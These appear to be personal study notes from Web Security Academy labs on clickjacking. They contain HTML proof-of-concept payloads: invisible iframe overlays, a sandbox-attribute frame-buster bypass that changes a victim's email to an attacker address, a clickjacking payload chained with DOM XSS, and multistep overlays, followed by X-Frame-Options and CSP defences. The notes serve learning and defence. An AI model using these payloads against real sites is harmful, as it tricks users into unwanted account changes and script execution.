                                     ## What is clickjacking?
# Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
 
# This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input. 


                                     ## How to construct a basic clickjacking attack



                              <head>
                                <style>
                                  #target_website {
                                    position:relative;
                                    width:128px;
                                    height:128px;
                                    opacity:0.00001;
                                    z-index:2;
                                    }
                                  #decoy_website {
                                    position:absolute;
                                    width:300px;
                                    height:400px;
                                    z-index:1;
                                    }
                                </style>
                              </head>
                              ...
                              <body>
                                <div id="decoy_website">
                                ...decoy web content here...
                                </div>
                                <iframe id="target_website" src="https://vulnerable-website.com">
                                </iframe>
                              </body>
                              
# The target website iframe is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values
# Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, browser type and platform.
   The z-index determines the stacking order of the iframe and website layers.
# The opacity value is defined as 0.0 (or close to 0.0) so that the iframe content is transparent to the user. 
# Browser clickjacking protection might apply threshold-based iframe transparency detection (for example, Chrome version 76 includes this behavior but Firefox does not). 
# The attacker selects opacity values so that the desired effect is achieved without triggering protection behaviors. 


                                 <style>
                        iframe {
                            position:relative;
                            width:1000px;
                            height: 700px;
                            opacity: 0.0001;
                            z-index: 2;
                        }
                        div {
                            position:absolute;
                            top: 515px;
                            left:60px;
                            z-index: 1;
                        }
                    </style>
                    <div>Test me</div>
                    <iframe src="https://0acb009004e04ce4c024c66300910047.web-security-academy.net/my-account"></iframe>



                                 ## Clickbandit
# Although you can manually create a clickjacking proof of concept as described above, this can be fairly tedious and time-consuming in practice. 
When you're testing for clickjacking in the wild, we recommend using Burp's Clickbandit tool instead. 


                              ## Clickjacking with prefilled form input
 # Some websites that require form completion and submission permit prepopulation of form inputs using GET parameters prior to submission.
 
 
                               ## Frame busting scripts
# Clickjacking attacks are possible whenever websites can be framed.
--> Therefore, preventative techniques are based upon restricting the framing capability for websites.

#  A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts.

# These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript

# Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers.

# An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute

# When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window

# <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>

# <iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>


                                                                
                              ## Combining clickjacking with a DOM XSS attack
# Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the XSS exploit.

# The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.

# <iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>


                            ## Multistep clickjacking
 # Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed.                          
 # These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.  
 
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:410;
		left:50;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a06004904c2771dc0960cb700890002.web-security-academy.net/my-account"></iframe>
                         
                     
                   ## How to prevent clickjacking attacks
 # X-Frame-Options
 ------> X-Frame-Options was originally introduced as an unofficial response header in Internet Explorer 8 and it was rapidly adopted within other browsers.
    Exampple: X-Frame-Options: deny
    
# Alternatively, framing can be restricted to the same origin as the website using the sameorigin directive
----------> X-Frame-Options: sameorigin

or to a named website using the allow-from directive:

X-Frame-Options: allow-from https://normal-website.com

                                  ## Content Security Policy (CSP)
# Content Security Policy (CSP) is a detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking. 
------->Content-Security-Policy: policy

# The recommended clickjacking protection is to incorporate the frame-ancestors directive in the application's Content Security Policy.
--------> 

# The frame-ancestors 'none' directive is similar in behavior to the X-Frame-Options deny directive.
----------> Content-Security-Policy: frame-ancestors 'self';

# Alternatively, framing can be restricted to named sites:
-------> Content-Security-Policy: frame-ancestors normal-website.com;
------> The frame-ancestors 'self' directive is broadly equivalent to the X-Frame-Options sameorigin directive. The following CSP whitelists frames to the same domain only:
